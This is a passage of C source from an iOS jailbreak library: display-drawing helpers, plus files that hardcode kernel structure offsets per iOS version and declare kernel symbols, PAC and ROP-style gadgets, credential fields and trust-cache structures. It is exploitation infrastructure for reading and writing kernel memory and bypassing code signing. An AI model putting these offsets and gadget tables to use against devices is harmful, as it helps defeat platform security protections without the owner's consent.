	if (!cgImage) return -1;
	int r = draw_image_to_buf_for_main_screen(cgImage, bufOut, bufSizeOut);
	CGImageRelease(cgImage);
	return r;
}

int display_draw_raw(void *rawBuf, size_t rawBufSize)
{
	int retval = display_init();
	if (retval) return retval;
	size_t displayBufSize = gDisplay.size.height * gDisplay.bytesPerRow;
	if (rawBufSize != displayBufSize) {
		return -1;
	}
	memcpy(gDisplay.base, rawBuf, rawBufSize);
	return display_update();
}

int display_draw_image_path(const char* image_path)
{
	int retval = -1;

	void *buf = NULL;
	size_t bufSize = 0;
	retval = draw_image_path_to_buf_for_main_screen(image_path, &buf, &bufSize);
	if (retval) return retval;
	retval = display_draw_raw(buf, bufSize);
    free(buf);
	return retval;
}

int display_draw_image(CGImageRef cgImage)
{
	int retval = -1;

	void *buf = NULL;
	size_t bufSize = 0;
	retval = draw_image_to_buf_for_main_screen(cgImage, &buf, &bufSize);
	if (retval) return retval;
	retval = display_draw_raw(buf, bufSize);
    free(buf);
	return retval;
}
```

`BaseBin/libjailbreak/src/info.c`:

```c
#include "info.h"
#include "kernel.h"
#include "machine_info.h"
#include "primitives.h"
#include <sys/utsname.h>
#include <xpc/xpc.h>
#include <sys/types.h>
#include <sys/sysctl.h>

struct system_info gSystemInfo = { 0 };

void jbinfo_initialize_dynamic_offsets(xpc_object_t xoffsetDict)
{
	SYSTEM_INFO_DESERIALIZE(xoffsetDict);
}

void jbinfo_initialize_hardcoded_offsets(void)
{
	struct utsname name;
	uname(&name);
	char *xnuVersion = name.release;

	cpu_subtype_t cpuFamily = 0;
	size_t cpuFamilySize = sizeof(cpuFamily);
	sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

	bool hasJitbox = (cpuFamily == CPUFAMILY_ARM_BLIZZARD_AVALANCHE || // A15
					  cpuFamily == CPUFAMILY_ARM_EVEREST_SAWTOOTH || // A16
					  cpuFamily == CPUFAMILY_ARM_COLL); // A17

	uint32_t taskJitboxAdjust = 0x0;
	if (hasJitbox) {
		taskJitboxAdjust = 0x10;
		if (strcmp(xnuVersion, "22.0.0") >= 0) {
			// In iOS 16, there is a new jitbox related attribute
			taskJitboxAdjust = 0x18;
		}
	}

	uint32_t pmapEl2Adjust = ((kconstant(kernel_el) == 2) ? 8 : 0);

#ifndef __arm64e__
	uint32_t pmapA11Adjust = 0;
	if (cpuFamily == CPUFAMILY_ARM_MONSOON_MISTRAL) {
		if (strcmp(xnuVersion, "21.0.0") >= 0) { // iOS 15+
			pmapA11Adjust = 1;
			if (strcmp(xnuVersion, "22.0.0") >= 0) { // iOS 16+
				pmapA11Adjust = 2;
			}
		}
	}
#endif

	// proc
	gSystemInfo.kernelStruct.proc.list_next =  0x0;
	gSystemInfo.kernelStruct.proc.list_prev =  0x8;
	gSystemInfo.kernelStruct.proc.task      = 0x10;
	gSystemInfo.kernelStruct.proc.pptr      = 0x18;
	gSystemInfo.kernelStruct.proc.pid       = 0x68;

	// filedesc
	gSystemInfo.kernelStruct.filedesc.ofiles_start = 0x20;

	// task
	gSystemInfo.kernelStruct.task.map     = 0x28;
	gSystemInfo.kernelStruct.task.threads = 0x60;

	// ipc_space
	gSystemInfo.kernelStruct.ipc_space.table          = 0x20;
	gSystemInfo.kernelStruct.ipc_space.table_uses_smr = false;

	// ipc_entry
	gSystemInfo.kernelStruct.ipc_entry.object      = 0x0;
	gSystemInfo.kernelStruct.ipc_entry.struct_size = 0x18;

	// vm_map
	gSystemInfo.kernelStruct.vm_map.hdr = 0x10;

	// pmap
	gSystemInfo.kernelStruct.pmap.tte        = 0x0;
	gSystemInfo.kernelStruct.pmap.ttep       = 0x8;
#ifdef __arm64e__
	gSystemInfo.kernelStruct.pmap.pmap_cs_main = 0x90;
	gSystemInfo.kernelStruct.pmap.sw_asid      = 0xBE + pmapEl2Adjust;
	gSystemInfo.kernelStruct.pmap.wx_allowed   = 0xC2 + pmapEl2Adjust;
	gSystemInfo.kernelStruct.pmap.type         = 0xC8 + pmapEl2Adjust;
#else
	gSystemInfo.kernelStruct.pmap.sw_asid    = 0x96;
	gSystemInfo.kernelStruct.pmap.wx_allowed = 0;
	gSystemInfo.kernelStruct.pmap.type       = 0x9c + pmapA11Adjust;
#endif

#ifdef __arm64e__
	// pmap_cs_region
	gSystemInfo.kernelStruct.pmap_cs_region.pmap_cs_region_next = 0x0;
	gSystemInfo.kernelStruct.pmap_cs_region.cd_entry            = 0x28;

	// pmap_cs_code_directory
	gSystemInfo.kernelStruct.pmap_cs_code_directory.pmap_cs_code_directory_next = 0x0;
	gSystemInfo.kernelStruct.pmap_cs_code_directory.main_binary                 = 0x50;
	gSystemInfo.kernelStruct.pmap_cs_code_directory.trust                       = 0x9C;
#endif

	// pt_desc
	gSystemInfo.kernelStruct.pt_desc.pmap     = 0x10;
	gSystemInfo.kernelStruct.pt_desc.va       = 0x18;
	gSystemInfo.kernelStruct.pt_desc.ptd_info = koffsetof(pt_desc, va) + (kconstant(PT_INDEX_MAX) * sizeof(uint64_t));

	// vm_map_header
	gSystemInfo.kernelStruct.vm_map_header.links    =  0x0;

	// vm_map_entry
	gSystemInfo.kernelStruct.vm_map_entry.links = 0x0;
	gSystemInfo.kernelStruct.vm_map_entry.flags = 0x48;

	// vm_map_links
	gSystemInfo.kernelStruct.vm_map_links.prev =  0x0;
	gSystemInfo.kernelStruct.vm_map_links.next =  0x8;
	gSystemInfo.kernelStruct.vm_map_links.min  = 0x10;
	gSystemInfo.kernelStruct.vm_map_links.max  = 0x18;

	// ucred
	uint32_t ucred_cr_posix = 0x18;
	gSystemInfo.kernelStruct.ucred.uid    = ucred_cr_posix +  0x0;
	gSystemInfo.kernelStruct.ucred.ruid   = ucred_cr_posix +  0x4;
	gSystemInfo.kernelStruct.ucred.svuid  = ucred_cr_posix +  0x8;
	gSystemInfo.kernelStruct.ucred.groups = ucred_cr_posix + 0x10;
	gSystemInfo.kernelStruct.ucred.rgid   = ucred_cr_posix + 0x50;
	gSystemInfo.kernelStruct.ucred.svgid  = ucred_cr_posix + 0x54;
	gSystemInfo.kernelStruct.ucred.label  = 0x78;

	if (strcmp(xnuVersion, "21.0.0") >= 0) { // iOS 15+
		// proc
		gSystemInfo.kernelStruct.proc.svuid   =  0x3C;
		gSystemInfo.kernelStruct.proc.svgid   =  0x40;
		gSystemInfo.kernelStruct.proc.ucred   =  0xD8;
		gSystemInfo.kernelStruct.proc.fd      =  0xE0;
		gSystemInfo.kernelStruct.proc.flag    = 0x1BC;
		gSystemInfo.kernelStruct.proc.textvp  = 0x2A8;
		gSystemInfo.kernelStruct.proc.csflags = 0x300;

		// task
#ifdef __arm64e__
		gSystemInfo.kernelStruct.task.task_can_transfer_memory_ownership = 0x5B0 + taskJitboxAdjust;
#else
		gSystemInfo.kernelStruct.task.task_can_transfer_memory_ownership = 0x590;
#endif

		// ipc_port
		gSystemInfo.kernelStruct.ipc_port.kobject = 0x58;

		// vm_map
		gSystemInfo.kernelStruct.vm_map.flags = 0x11C;

		// trustcache
		gSystemInfo.kernelStruct.trustcache.nextptr        =  0x0;
		gSystemInfo.kernelStruct.trustcache.fileptr        =  0x8;
		gSystemInfo.kernelStruct.trustcache.struct_size = 0x10;

		if (strcmp(xnuVersion, "21.2.0") >= 0) { // iOS 15.2+
			// proc
			gSystemInfo.kernelStruct.proc.ucred   =   0x0; // Moved to proc_ro
			gSystemInfo.kernelStruct.proc.csflags =   0x0; // Moved to proc_ro
			gSystemInfo.kernelStruct.proc.proc_ro =  0x20;
			gSystemInfo.kernelStruct.proc.svuid   =  0x44;
			gSystemInfo.kernelStruct.proc.svgid   =  0x48;
			gSystemInfo.kernelStruct.proc.fd      =  0xD8;
			gSystemInfo.kernelStruct.proc.flag    = 0x264;
			gSystemInfo.kernelStruct.proc.textvp  = 0x358;

			// proc_ro
			gSystemInfo.kernelStruct.proc_ro.exists  = true;
			gSystemInfo.kernelStruct.proc_ro.csflags = 0x1C;
			gSystemInfo.kernelStruct.proc_ro.ucred   = 0x20;

			// task
#ifdef __arm64e__
			gSystemInfo.kernelStruct.task.task_can_transfer_memory_ownership = 0x580 + taskJitboxAdjust;
#else
			gSystemInfo.kernelStruct.task.task_can_transfer_memory_ownership = 0x560;
#endif
			if (strcmp(xnuVersion, "21.4.0") >= 0) { // iOS 15.4+
				// proc
				gSystemInfo.kernelStruct.proc.textvp = 0x350;

				// vm_map
				gSystemInfo.kernelStruct.vm_map.flags = 0x94;

				// ipc_port
				gSystemInfo.kernelStruct.ipc_port.kobject = 0x48;

				if (strcmp(xnuVersion, "22.0.0") >= 0) { // iOS 16+
					gSystemInfo.kernelConstant.smrBase = 3;

					// proc
					gSystemInfo.kernelStruct.proc.task    =   0x0; // Removed, task is now at (proc + sizeof(proc))
					gSystemInfo.kernelStruct.proc.pptr    =  0x10;
					gSystemInfo.kernelStruct.proc.proc_ro =  0x18;
					gSystemInfo.kernelStruct.proc.svuid   =  0x3C;
					gSystemInfo.kernelStruct.proc.svgid   =  0x40;
					gSystemInfo.kernelStruct.proc.pid     =  0x60;
					gSystemInfo.kernelStruct.proc.fd      =  0xD8;
					gSystemInfo.kernelStruct.proc.flag    = 0x25C;
					gSystemInfo.kernelStruct.proc.textvp  = 0x350;

					gSystemInfo.kernelStruct.proc_ro.syscall_filter_mask = 0x28;
					gSystemInfo.kernelStruct.proc_ro.mach_trap_filter_mask = 0x68;
					gSystemInfo.kernelStruct.proc_ro.mach_kobj_filter_mask = 0x70;

					// task
#ifdef __arm64e__
					gSystemInfo.kernelStruct.task.task_can_transfer_memory_ownership = 0x548 + taskJitboxAdjust;
					gSystemInfo.kernelStruct.task.flags = 0x3b8 + taskJitboxAdjust;
#else
					gSystemInfo.kernelStruct.task.task_can_transfer_memory_ownership = 0x528;
					gSystemInfo.kernelStruct.task.flags = 0x3a0;
#endif
					// vm_map
					gSystemInfo.kernelStruct.vm_map.flags = 0xB4;

					// trustcache
					gSystemInfo.kernelStruct.trustcache.nextptr = 0x0;
					gSystemInfo.kernelStruct.trustcache.prevptr = 0x8;
					gSystemInfo.kernelStruct.trustcache.size = 0x18;
					gSystemInfo.kernelStruct.trustcache.fileptr = 0x20;
					gSystemInfo.kernelStruct.trustcache.struct_size = 0x28;

					// pmap
#ifdef __arm64e__
					gSystemInfo.kernelStruct.pmap.sw_asid    = 0xB6 + pmapEl2Adjust;
					gSystemInfo.kernelStruct.pmap.wx_allowed = 0xBA + pmapEl2Adjust;
					gSystemInfo.kernelStruct.pmap.type       = 0xC0 + pmapEl2Adjust;
#else
					gSystemInfo.kernelStruct.pmap.sw_asid    = 0x8e;
					gSystemInfo.kernelStruct.pmap.wx_allowed = 0;
					gSystemInfo.kernelStruct.pmap.type       = 0x94 + pmapA11Adjust;
#endif

#ifdef __arm64e__
					// pmap_cs_code_directory
					gSystemInfo.kernelStruct.pmap_cs_code_directory.main_binary = 0x190;
					gSystemInfo.kernelStruct.pmap_cs_code_directory.trust       = 0x1DC;
#endif

					if (strcmp(xnuVersion, "22.1.0") >= 0) { // iOS 16.1+
						gSystemInfo.kernelStruct.ipc_space.table_uses_smr = true;

						// proc_ro
						gSystemInfo.kernelStruct.proc_ro.t_flags_ro = 0x78;

						if (strcmp(xnuVersion, "22.3.0") >= 0) { // iOS 16.3+
							gSystemInfo.kernelConstant.smrBase = 2;
							if (strcmp(xnuVersion, "22.4.0") >= 0) { // iOS 16.4+
								// proc
								gSystemInfo.kernelStruct.proc.flag   = 0x454;
								gSystemInfo.kernelStruct.proc.textvp = 0x548;

#ifdef __arm64e__
								// pmap_cs_code_directory
								gSystemInfo.kernelStruct.pmap_cs_code_directory.trust = 0x1EC;
#endif

								if (strcmp(xnuVersion, "22.4.0") == 0) { // iOS 16.4 ONLY 
									// iOS 16.4 beta 1-3 use the old proc struct, 16.4b4+ use new
									if (gSystemInfo.kernelStruct.proc.struct_size != 0x730) {
										gSystemInfo.kernelStruct.proc.flag    = 0x25C;
										gSystemInfo.kernelStruct.proc.textvp  = 0x350;
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

void jbinfo_initialize_boot_constants(void)
{
	gSystemInfo.kernelConstant.base     = kconstant(staticBase) + gSystemInfo.kernelConstant.slide;
	gSystemInfo.kernelConstant.virtBase = kread64(ksymbol(gVirtBase));
	//gSystemInfo.kernelConstant.virtSize = ...;
	gSystemInfo.kernelConstant.physBase = kread64(ksymbol(gPhysBase));
	gSystemInfo.kernelConstant.physSize = kread64(ksymbol(gPhysSize));
	gSystemInfo.kernelConstant.cpuTTEP  = kread64(ksymbol(cpu_ttep));
}

xpc_object_t jbinfo_get_serialized(void)
{
	xpc_object_t systemInfo = xpc_dictionary_create_empty();
	SYSTEM_INFO_SERIALIZE(systemInfo);
	return systemInfo;
}

uint64_t get_vm_real_kernel_page_size(void)
{
	static uint64_t real_kernel_page_size = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		real_kernel_page_size = vm_kernel_page_size;

		// vm_kernel_page_size is WRONG on A8X
		// Screw Apple
		cpu_subtype_t cpuFamily = 0;
		size_t cpuFamilySize = sizeof(cpuFamily);
		sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
		if (cpuFamily == CPUFAMILY_ARM_TYPHOON) {
			real_kernel_page_size = 0x1000;
		}
	});
	return real_kernel_page_size;
}


uint64_t get_vm_real_kernel_page_shift(void)
{
	static uint64_t real_kernel_page_shift = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		real_kernel_page_shift = vm_kernel_page_shift;

		// vm_kernel_page_shift is WRONG on A8X
		// Screw Apple
		cpu_subtype_t cpuFamily = 0;
		size_t cpuFamilySize = sizeof(cpuFamily);
		sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
		if (cpuFamily == CPUFAMILY_ARM_TYPHOON) {
			real_kernel_page_shift = 14;
		}
	});
	return real_kernel_page_shift;
}

uint64_t get_l1_block_size(void)
{
	switch (vm_real_kernel_page_size) {
		case 0x4000:
		return 0x1000000000;
		case 0x1000:
		return 0x40000000;
		default:
		return 0;
	}
}

uint64_t get_l1_block_mask(void)
{
	return get_l1_block_size() - 1;
}

uint64_t get_l1_block_count(void)
{
	switch (vm_real_kernel_page_size) {
		case 0x4000:
		return 8;
		case 0x1000:
		return 256;
		default:
		return 0;
	}
}

uint64_t get_l2_block_size(void)
{
	switch (vm_real_kernel_page_size) {
		case 0x4000:
		return 0x2000000;
		case 0x1000:
		return 0x200000;
		default:
		return 0;
	}
}

uint64_t get_l2_block_mask(void)
{
	return get_l2_block_size() - 1;
}

uint64_t get_l2_block_count(void)
{
	switch (vm_real_kernel_page_size) {
		case 0x4000:
		return 2048;
		case 0x1000:
		return 512;
		default:
		return 0;
	}
}

```

`BaseBin/libjailbreak/src/info.h`:

```h
#ifndef __INFO_H
#define __INFO_H

#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <xpc/xpc.h>

struct system_info {
	struct {
		uint64_t slide;
		uint64_t staticBase;
		uint64_t base;
		uint64_t virtBase;
		uint64_t virtSize;
		uint64_t physBase;
		uint64_t physSize;
		uint64_t cpuTTEP;
		uint64_t kernel_el;
		uint64_t pointer_mask;
		uint64_t T1SZ_BOOT;
		uint64_t ARM_TT_L1_INDEX_MASK;
		uint64_t smrBase;
		uint64_t PT_INDEX_MAX;
		uint64_t nsysent;
		uint64_t mach_trap_count;
	} kernelConstant;

	struct {
		uint64_t usesPACBypass;
		char *rootPath;
	} jailbreakInfo;

	struct {
		bool markAppsAsDebugged;
		double jetsamMultiplier;
	} jailbreakSettings;

	struct {
		// Functions
		uint64_t perfmon_dev_open;
		uint64_t vn_kqfilter;
		uint64_t proc_find;
		uint64_t proc_rele;
		uint64_t kalloc_data_external;
		uint64_t kfree_data_external;
		uint64_t ml_sign_thread_state;
		uint64_t pmap_alloc_page_for_kern;
		uint64_t pmap_create_options;
		uint64_t pmap_enter_options_addr;
		uint64_t pmap_mark_page_as_ppl_page;
		uint64_t pmap_nest;
		uint64_t pmap_remove_options;
		uint64_t pmap_set_nested;
		uint64_t hw_lck_ticket_reserve_orig_allow_invalid;
		uint64_t exception_return;
		uint64_t mac_label_set;

		// Variables
		uint64_t perfmon_devices;
		uint64_t cdevsw;
		uint64_t allproc;
		uint64_t gPhysBase;
		uint64_t gPhysSize;
		uint64_t gVirtBase;
		uint64_t cpu_ttep;
		uint64_t ptov_table;
		uint64_t vm_first_phys;
		uint64_t vm_first_phys_ppnum;
		uint64_t vm_last_phys;
		uint64_t pv_head_table;
		uint64_t pp_attr_table;
		uint64_t vm_page_array_beginning_addr;
		uint64_t vm_page_array_ending_addr;
		uint64_t pmap_image4_trust_caches;
		uint64_t ppl_trust_cache_rt;
		uint64_t mach_kobj_count;
		uint64_t developer_mode_enabled;
	} kernelSymbol;

	struct {
		uint64_t pacda;
		uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed;
		uint64_t ldp_x0_x1_x8;
		uint64_t br_x22;
		uint64_t exception_return_after_check;
		uint64_t exception_return_after_check_no_restore;
		uint64_t str_x0_x19_ldr_x20;
		uint64_t str_x8_x0;
		uint64_t str_x8_x9;
		uint64_t kcall_return;
	} kernelGadget;

	struct {
		struct {
			uint32_t list_next;
			uint32_t list_prev;
			uint32_t task;
			uint32_t pptr;
			uint32_t proc_ro;
			uint32_t svuid;
			uint32_t svgid;
			uint32_t pid;
			uint32_t fd;
			uint32_t flag;
			uint32_t textvp;

			uint32_t ucred;
			uint32_t csflags;
			uint32_t syscall_filter_mask;
			uint32_t struct_size;
		} proc;

		struct {
			bool exists;
			uint32_t ucred;
			uint32_t csflags;
			uint32_t syscall_filter_mask;
			uint32_t mach_trap_filter_mask;
			uint32_t mach_kobj_filter_mask;
			uint32_t t_flags_ro;
		} proc_ro;

		struct {
			uint64_t ofiles_start;
		} filedesc;

		struct {
			uint32_t uid;
			uint32_t ruid;
			uint32_t svuid;
			uint32_t groups;
			uint32_t rgid;
			uint32_t svgid;
			uint32_t label;
		} ucred;

		struct {
			uint32_t map;
			uint32_t threads;
			uint32_t itk_space;
			uint32_t flags;
			uint32_t task_can_transfer_memory_ownership;
			uint32_t mach_trap_filter_mask;
			uint32_t mach_kobj_filter_mask;
		} task;

		struct {
			uint32_t recover;
			uint32_t machine_kstackptr;
			uint32_t machine_CpuDatap;
			uint32_t machine_contextData;
		} thread;

		struct {
			uint32_t table;
			bool table_uses_smr;
		} ipc_space;

		struct {
			uint32_t object;
			uint32_t struct_size;
		} ipc_entry;

		struct {
			uint32_t kobject;
		} ipc_port;

		struct {
			uint32_t hdr;
			uint32_t pmap;
			uint32_t flags;
		} vm_map;

		struct {
			uint32_t links;
		} vm_map_header;

		struct {
			uint32_t links;
			uint32_t flags;
		} vm_map_entry;

		struct {
			uint32_t prev;
			uint32_t next;
			uint32_t min;
			uint32_t max;
		} vm_map_links;

		struct {
			uint32_t tte;
			uint32_t ttep;
			uint32_t pmap_cs_main;
			uint32_t sw_asid;
			uint32_t wx_allowed;
			uint32_t type;
		} pmap;

		struct {
			uint32_t pmap_cs_region_next;
			uint32_t cd_entry;
		} pmap_cs_region;

		struct {
			uint32_t pmap_cs_code_directory_next;
			uint32_t main_binary;
			uint32_t trust;
		} pmap_cs_code_directory;

		struct {
			uint32_t pmap;
			uint32_t va;
			uint32_t ptd_info;
		} pt_desc;

		struct {
			uint32_t nextptr;
			uint32_t prevptr;
			uint32_t size;
			uint32_t fileptr;

			uint32_t struct_size;
		} trustcache;
	} kernelStruct;
};

extern struct system_info gSystemInfo;

#define KERNEL_CONSTANTS_ITERATE(ctx, iterator) \
	iterator(ctx, kernelConstant.slide); \
	iterator(ctx, kernelConstant.staticBase); \
	iterator(ctx, kernelConstant.base); \
	iterator(ctx, kernelConstant.virtBase); \
	iterator(ctx, kernelConstant.virtSize); \
	iterator(ctx, kernelConstant.physBase); \
	iterator(ctx, kernelConstant.physSize); \
	iterator(ctx, kernelConstant.cpuTTEP); \
	iterator(ctx, kernelConstant.kernel_el); \
	iterator(ctx, kernelConstant.pointer_mask); \
	iterator(ctx, kernelConstant.T1SZ_BOOT); \
	iterator(ctx, kernelConstant.ARM_TT_L1_INDEX_MASK); \
	iterator(ctx, kernelConstant.smrBase); \
	iterator(ctx, kernelConstant.PT_INDEX_MAX); \
	iterator(ctx, kernelConstant.nsysent); \
	iterator(ctx, kernelConstant.mach_trap_count);

#define JAILBREAK_INFO_ITERATE(ctx, iterator) \
	iterator(ctx, jailbreakInfo.usesPACBypass); \
	iterator(ctx, jailbreakInfo.rootPath);

#define JAILBREAK_SETTINGS_ITERATE(ctx, iterator) \
	iterator(ctx, jailbreakSettings.markAppsAsDebugged); \
	iterator(ctx, jailbreakSettings.jetsamMultiplier);

#define KERNEL_SYMBOLS_ITERATE(ctx, iterator) \
	iterator(ctx, kernelSymbol.perfmon_dev_open); \
	iterator(ctx, kernelSymbol.vn_kqfilter); \
	iterator(ctx, kernelSymbol.proc_find); \
	iterator(ctx, kernelSymbol.proc_rele); \
	iterator(ctx, kernelSymbol.kalloc_data_external); \
	iterator(ctx, kernelSymbol.kfree_data_external); \
	iterator(ctx, kernelSymbol.ml_sign_thread_state); \
	iterator(ctx, kernelSymbol.pmap_alloc_page_for_kern); \
	iterator(ctx, kernelSymbol.pmap_create_options); \
	iterator(ctx, kernelSymbol.pmap_enter_options_addr); \
	iterator(ctx, kernelSymbol.pmap_mark_page_as_ppl_page); \
	iterator(ctx, kernelSymbol.pmap_nest); \
	iterator(ctx, kernelSymbol.pmap_remove_options); \
	iterator(ctx, kernelSymbol.pmap_set_nested); \
	iterator(ctx, kernelSymbol.hw_lck_ticket_reserve_orig_allow_invalid); \
	iterator(ctx, kernelSymbol.exception_return); \
	iterator(ctx, kernelSymbol.mac_label_set); \
	\
	iterator(ctx, kernelSymbol.perfmon_devices); \
	iterator(ctx, kernelSymbol.cdevsw); \
	iterator(ctx, kernelSymbol.allproc); \
	iterator(ctx, kernelSymbol.gPhysBase); \
	iterator(ctx, kernelSymbol.gPhysSize); \
	iterator(ctx, kernelSymbol.gVirtBase); \
	iterator(ctx, kernelSymbol.cpu_ttep); \
	iterator(ctx, kernelSymbol.ptov_table); \
	iterator(ctx, kernelSymbol.vm_first_phys); \
	iterator(ctx, kernelSymbol.vm_first_phys_ppnum); \
	iterator(ctx, kernelSymbol.vm_last_phys); \
	iterator(ctx, kernelSymbol.pv_head_table); \
	iterator(ctx, kernelSymbol.pp_attr_table); \
	iterator(ctx, kernelSymbol.vm_page_array_beginning_addr); \
	iterator(ctx, kernelSymbol.vm_page_array_ending_addr); \
	iterator(ctx, kernelSymbol.pmap_image4_trust_caches); \
	iterator(ctx, kernelSymbol.ppl_trust_cache_rt); \
	iterator(ctx, kernelSymbol.mach_kobj_count); \
	iterator(ctx, kernelSymbol.developer_mode_enabled);

#define KERNEL_GADGETS_ITERATE(ctx, iterator) \
	iterator(ctx, kernelGadget.pacda); \
	iterator(ctx, kernelGadget.hw_lck_ticket_reserve_orig_allow_invalid_signed); \
	iterator(ctx, kernelGadget.ldp_x0_x1_x8); \
	iterator(ctx, kernelGadget.br_x22); \
	iterator(ctx, kernelGadget.exception_return_after_check); \
	iterator(ctx, kernelGadget.exception_return_after_check_no_restore); \
	iterator(ctx, kernelGadget.str_x0_x19_ldr_x20); \
	iterator(ctx, kernelGadget.str_x8_x0); \
	iterator(ctx, kernelGadget.str_x8_x9); \
	iterator(ctx, kernelGadget.kcall_return);

#define KERNEL_STRUCTS_ITERATE(ctx, iterator) \
	iterator(ctx, kernelStruct.proc.list_next); \
	iterator(ctx, kernelStruct.proc.list_prev); \
	iterator(ctx, kernelStruct.proc.task); \
	iterator(ctx, kernelStruct.proc.pptr); \
	iterator(ctx, kernelStruct.proc.proc_ro); \
	iterator(ctx, kernelStruct.proc.svuid); \
	iterator(ctx, kernelStruct.proc.svgid); \
	iterator(ctx, kernelStruct.proc.pid); \
	iterator(ctx, kernelStruct.proc.fd); \
	iterator(ctx, kernelStruct.proc.flag); \
	iterator(ctx, kernelStruct.proc.textvp); \
	iterator(ctx, kernelStruct.proc.ucred); \
	iterator(ctx, kernelStruct.proc.csflags); \
	iterator(ctx, kernelStruct.proc.syscall_filter_mask); \
	iterator(ctx, kernelStruct.proc.struct_size); \
	\
	iterator(ctx, kernelStruct.proc_ro.exists); \
	iterator(ctx, kernelStruct.proc_ro.ucred); \
	iterator(ctx, kernelStruct.proc_ro.csflags); \
	iterator(ctx, kernelStruct.proc_ro.syscall_filter_mask); \
	iterator(ctx, kernelStruct.proc_ro.mach_trap_filter_mask); \
	iterator(ctx, kernelStruct.proc_ro.mach_kobj_filter_mask); \
	iterator(ctx, kernelStruct.proc_ro.t_flags_ro); \
	\
	iterator(ctx, kernelStruct.filedesc.ofiles_start); \
	\
	iterator(ctx, kernelStruct.ucred.uid); \
	iterator(ctx, kernelStruct.ucred.ruid); \
	iterator(ctx, kernelStruct.ucred.svuid); \
	iterator(ctx, kernelStruct.ucred.groups); \
	iterator(ctx, kernelStruct.ucred.rgid); \
	iterator(ctx, kernelStruct.ucred.svgid); \
	iterator(ctx, kernelStruct.ucred.label); \
	\
	iterator(ctx, kernelStruct.task.map); \
	iterator(ctx, kernelStruct.task.threads); \
	iterator(ctx, kernelStruct.task.itk_space); \
	iterator(ctx, kernelStruct.task.flags); \
	iterator(ctx, kernelStruct.task.task_can_transfer_memory_ownership); \
	iterator(ctx, kernelStruct.task.mach_trap_filter_mask); \
	iterator(ctx, kernelStruct.task.mach_kobj_filter_mask); \
	\
	iterator(ctx, kernelStruct.thread.recover); \
	iterator(ctx, kernelStruct.thread.machine_kstackptr); \
	iterator(ctx, kernelStruct.thread.machine_CpuDatap); \
	iterator(ctx, kernelStruct.thread.machine_contextData); \
	\
	iterator(ctx, kernelStruct.ipc_space.table); \
	iterator(ctx, kernelStruct.ipc_space.table_uses_smr); \
	\
	iterator(ctx, kernelStruct.ipc_entry.object); \
	iterator(ctx, kernelStruct.ipc_entry.struct_size); \
	\
	iterator(ctx, kernelStruct.ipc_port.kobject); \
	\
	iterator(ctx, kernelStruct.vm_map.hdr); \
	iterator(ctx, kernelStruct.vm_map.pmap); \
	iterator(ctx, kernelStruct.vm_map.flags); \
	\
	iterator(ctx, kernelStruct.vm_map_header.links); \
	\
	iterator(ctx, kernelStruct.vm_map_entry.links); \
	iterator(ctx, kernelStruct.vm_map_entry.flags); \
	\
	iterator(ctx, kernelStruct.vm_map_links.prev); \
	iterator(ctx, kernelStruct.vm_map_links.next); \
	iterator(ctx, kernelStruct.vm_map_links.min); \
	iterator(ctx, kernelStruct.vm_map_links.max); \
	\
	iterator(ctx, kernelStruct.pmap.tte); \
	iterator(ctx, kernelStruct.pmap.ttep); \
	iterator(ctx, kernelStruct.pmap.pmap_cs_main); \
	iterator(ctx, kernelStruct.pmap.sw_asid); \
	iterator(ctx, kernelStruct.pmap.wx_allowed); \
	iterator(ctx, kernelStruct.pmap.type); \
	\
	iterator(ctx, kernelStruct.pmap_cs_region.pmap_cs_region_next); \
	iterator(ctx, kernelStruct.pmap_cs_region.cd_entry); \
	\
	iterator(ctx, kernelStruct.pmap_cs_code_directory.pmap_cs_code_directory_next); \
	iterator(ctx, kernelStruct.pmap_cs_code_directory.main_binary); \
	iterator(ctx, kernelStruct.pmap_cs_code_directory.trust); \
	\
	iterator(ctx, kernelStruct.pt_desc.pmap); \
	iterator(ctx, kernelStruct.pt_desc.va); \
	iterator(ctx, kernelStruct.pt_desc.ptd_info); \
	\
	iterator(ctx, kernelStruct.trustcache.nextptr); \
	iterator(ctx, kernelStruct.trustcache.prevptr); \
	iterator(ctx, kernelStruct.trustcache.size); \
	iterator(ctx, kernelStruct.trustcache.fileptr); \
	iterator(ctx, kernelStruct.trustcache.struct_size);

#define SYSTEM_INFO_ITERATE(ctx, iterator) \
	KERNEL_CONSTANTS_ITERATE(ctx, iterator); \
	JAILBREAK_INFO_ITERATE(ctx, iterator); \
	JAILBREAK_SETTINGS_ITERATE(ctx, iterator); \
	KERNEL_SYMBOLS_ITERATE(ctx, iterator); \
	KERNEL_GADGETS_ITERATE(ctx, iterator); \
	KERNEL_STRUCTS_ITERATE(ctx, iterator);

__attribute__((__unused__)) static void _safe_xpc_dictionary_get_string(xpc_object_t xdict, const char *name, char **out)
{
	const char *str = xpc_dictionary_get_string(xdict, name);
	if (str) {
		if (*out) free(*out);
		*out = strdup(str);
	}
}

__attribute__((__unused__)) static void _safe_xpc_dictionary_set_string(xpc_object_t xdict, const char *name, const char *string)
{
	if (string) {
		xpc_dictionary_set_string(xdict, name, string);
	}
}

#define XPC_SET_GENERIC(xdict, name, value) _Generic((value), \
	const char *: _safe_xpc_dictionary_set_string(xdict, name, (const char*)(uint64_t)value), \
	char *: _safe_xpc_dictionary_set_string(xdict, name, (const char*)(uint64_t)value), \
	uint64_t: xpc_dictionary_set_uint64(xdict, name, (uint64_t)value), \
	uint32_t: xpc_dictionary_set_uint64(xdict, name, (uint64_t)value), \
	double: xpc_dictionary_set_double(xdict, name, *(double *)&value), \
	bool: xpc_dictionary_set_bool(xdict, name, (bool)value) \
)

#define XPC_GET_GENERIC(xdict, name, target) _Generic((target), \
	const char *: _safe_xpc_dictionary_get_string(xdict, name, (char **)&target), \
	char *: _safe_xpc_dictionary_get_string(xdict, name, (char **)&target), \
	uint64_t: *((uint64_t *)&target) = xpc_dictionary_get_uint64(xdict, name), \
	uint32_t: *((uint32_t *)&target) = (uint32_t)xpc_dictionary_get_uint64(xdict, name), \
	double: *((double *)&target) = xpc_dictionary_get_double(xdict, name), \
	bool: *((bool *)&target) = xpc_dictionary_get_bool(xdict, name) \
)

